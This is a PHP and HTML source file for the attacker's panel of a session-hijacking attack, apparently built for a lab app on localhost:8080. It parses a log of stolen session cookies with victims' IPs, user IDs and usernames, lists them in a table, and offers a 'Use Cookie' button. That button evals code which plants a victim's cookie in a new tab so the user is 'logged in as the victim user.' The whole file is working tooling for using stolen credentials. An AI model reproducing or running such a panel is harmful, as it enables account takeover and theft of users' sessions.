<?php
$logs = file_exists('stolen_cookies.log') ? file_get_contents('stolen_cookies.log') : '';

// Parse logs to extract usernames and user IDs
$parsedLogs = [];
if (!empty($logs)) {
    $logLines = explode("\n", trim($logs));
    foreach ($logLines as $line) {
        if (empty($line)) continue;
        
        // Extract timestamp
        $timestamp = '';
        if (preg_match('/\[(.*?)\]/', $line, $matches)) {
            $timestamp = $matches[1];
        }
        
        // Extract IP
        $ip = '';
        if (preg_match('/from ([\d\.]+)/', $line, $matches)) {
            $ip = $matches[1];
        }
        
        // Extract User ID and Username
        $userId = '';
        $username = '';
        if (preg_match('/User ID: (.*?), Username: (.*?)\):/', $line, $matches)) {
            $userId = $matches[1];
            $username = $matches[2];
        }
        
        // Extract cookie
        $cookie = '';
        if (preg_match('/: (user_session=.*?)$/', $line, $matches)) {
            $cookie = $matches[1];
        }
        
        $parsedLogs[] = [
            'timestamp' => $timestamp,
            'ip' => $ip,
            'userId' => $userId,
            'username' => $username,
            'cookie' => $cookie,
            'raw' => $line
        ];
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Stolen Cookies Log</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            padding: 20px; 
            line-height: 1.6;
            color: #333;
        }
        h1 { 
            color: #d9534f;
            border-bottom: 2px solid #d9534f;
            padding-bottom: 10px;
        }
        .log-container {
            margin: 20px 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            box-shadow: 0 2px 3px rgba(0,0,0,0.1);
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #f8f8f8;
            font-weight: bold;
        }
        tr:hover {
            background-color: #f5f5f5;
        }
        .cookie-value {
            font-family: monospace;
            background: #f4f4f4;
            padding: 5px;
            border-radius: 3px;
            word-break: break-all;
        }
        .copy-btn {
            background: #5bc0de;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            margin-left: 10px;
        }
        .copy-btn:hover {
            background: #46b8da;
        }
        .use-cookie {
            background: #5cb85c;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin-left: 10px;
        }
        .use-cookie:hover {
            background: #4cae4c;
        }
        .raw-logs {
            margin-top: 30px;
            background: #f4f4f4;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
        }
        .toggle-raw {
            background: #f0ad4e;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 3px;
            cursor: pointer;
            margin-top: 20px;
        }
        .toggle-raw:hover {
            background: #ec971f;
        }
    </style>
</head>
<body>
    <h1>Stolen Cookies Log</h1>
    
    <div class="log-container">
        <?php if (empty($parsedLogs)): ?>
            <p>No cookies have been stolen yet.</p>
        <?php else: ?>
            <table>
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>IP Address</th>
                        <th>Username</th>
                        <th>User ID</th>
                        <th>Cookie</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($parsedLogs as $log): ?>
                    <tr>
                        <td><?php echo htmlspecialchars($log['timestamp']); ?></td>
                        <td><?php echo htmlspecialchars($log['ip']); ?></td>
                        <td><?php echo htmlspecialchars($log['username']); ?></td>
                        <td><?php echo htmlspecialchars($log['userId']); ?></td>
                        <td>
                            <span class="cookie-value"><?php echo htmlspecialchars($log['cookie']); ?></span>
                            <button class="copy-btn" onclick="copyToClipboard('<?php echo htmlspecialchars($log['cookie']); ?>')">Copy</button>
                        </td>
                        <td>
                            <a href="javascript:void(0)" class="use-cookie" onclick="useCookie('<?php echo htmlspecialchars($log['cookie']); ?>')">Use Cookie</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
            
            <button class="toggle-raw" onclick="toggleRawLogs()">Toggle Raw Logs</button>
            
            <div class="raw-logs" id="raw-logs" style="display: none;">
                <?php echo htmlspecialchars($logs); ?>
            </div>
        <?php endif; ?>
    </div>
    
    <script>
        function copyToClipboard(text) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            alert('Cookie copied to clipboard!');
        }
        
        function useCookie(cookie) {
            const code = `
// Open a new tab to the vulnerable app
const tab = window.open('http://localhost:8080', '_blank');

// Wait for the tab to load, then set the cookie
setTimeout(() => {
    tab.document.cookie = "${cookie}; path=/";
    tab.location.reload();
    alert('Cookie set! You are now logged in as the victim user.');
}, 1000);
            `;
            
            eval(code);
        }
        
        function toggleRawLogs() {
            const rawLogs = document.getElementById('raw-logs');
            if (rawLogs.style.display === 'none') {
                rawLogs.style.display = 'block';
            } else {
                rawLogs.style.display = 'none';
            }
        }
    </script>
</body>
</html> 